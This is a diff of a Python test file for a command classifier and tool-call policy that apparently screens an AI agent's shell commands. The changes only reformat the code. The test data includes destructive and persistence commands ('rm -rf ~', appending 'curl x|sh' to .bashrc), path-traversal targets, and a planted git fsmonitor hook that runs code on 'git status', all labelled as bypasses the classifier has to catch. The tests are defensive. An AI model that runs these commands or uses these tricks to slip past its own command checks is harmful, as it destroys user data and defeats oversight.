@@ -78,7 +78,7 @@ C = CommandClassifier(root="/workspace")
         "python -c \"open('../x','w')\"",
         "python -c \"open('/home/u/.bashrc','a').write('curl x|sh')\"",
         "python -c 'from os import system as s; s(\"rm -rf ~\")'",
-        "python -c 'o=__builtins__.open; o(\"../x\",\"w\")'",
+        'python -c \'o=__builtins__.open; o("../x","w")\'',
         "ruby -e 'File.delete(\"../x\")'",
         "git submodule foreach 'rm -rf ~'",
         "git difftool --extcmd=evil",
@@ -123,7 +123,7 @@ def test_round4_bypasses_are_dangerous(cmd):
         "pytest -k 'a or b' -m slow tests/",
         "python -m pytest -o console_output_style=classic",
         "pytest --junitxml=report.xml",
-        "echo '{\"a\": 1, \"b\": 2}'",
+        'echo \'{"a": 1, "b": 2}\'',
         "awk '{print $1,$2}' f",
         "jq '{a,b}' x.json",
         "python -c \"print(open('setup.py').read())\"",
@@ -184,8 +184,13 @@ def test_the_chain_really_executes_code_when_git_dir_is_planted(tmp_path: Path):
     (fake / "refs").mkdir()
     (fake / "HEAD").write_text("ref: refs/heads/main\n")
     (fake / "config").write_text('[core]\n\tfsmonitor = "echo RAN > marker.txt; false"\n')
-    subprocess.run(["git", "--git-dir=fake", "--work-tree=.", "status"], cwd=tmp_path,
-                   capture_output=True, check=False, timeout=60)
+    subprocess.run(
+        ["git", "--git-dir=fake", "--work-tree=.", "status"],
+        cwd=tmp_path,
+        capture_output=True,
+        check=False,
+        timeout=60,
+    )
     assert (tmp_path / "marker.txt").exists()  # arbitrary code ran from a plain `status`
     assert C.rate("git --git-dir=fake --work-tree=. status").risk == "dangerous"
 
@@ -209,9 +214,7 @@ def test_run_tests_refuses_an_option_target(tmp_path: Path):
     assert pol.check(ToolCall("run_tests", {"target": "--junitxml=../x"})).decision is (
         Decision.ASK
     )
-    assert pol.check(ToolCall("run_tests", {"target": "../other/tests"})).decision is (
-        Decision.ASK
-    )
+    assert pol.check(ToolCall("run_tests", {"target": "../other/tests"})).decision is (Decision.ASK)
     assert pol.check(ToolCall("run_tests", {"target": "tests/test_a.py::t"})).decision is (
         Decision.ALLOW
     )
